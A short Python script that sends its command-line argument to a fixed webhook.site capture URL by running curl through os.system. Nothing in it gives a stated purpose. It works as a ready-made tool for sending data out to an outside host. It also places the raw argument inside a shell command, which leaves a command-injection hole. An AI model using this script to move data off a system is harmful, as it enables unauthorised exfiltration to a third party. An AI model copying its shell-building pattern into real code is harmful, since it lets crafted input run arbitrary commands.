import os
import sys

if len(sys.argv) != 2:
    print("Usage: python3 main.py <DATA>")
    sys.exit(1)
 
data = sys.argv[1] 
url = f"https://webhook.site/fd644fc7-7be3-42a2-aaab-1353b62ad229/?data={data}"
  

os.system(f"curl '{url}'")
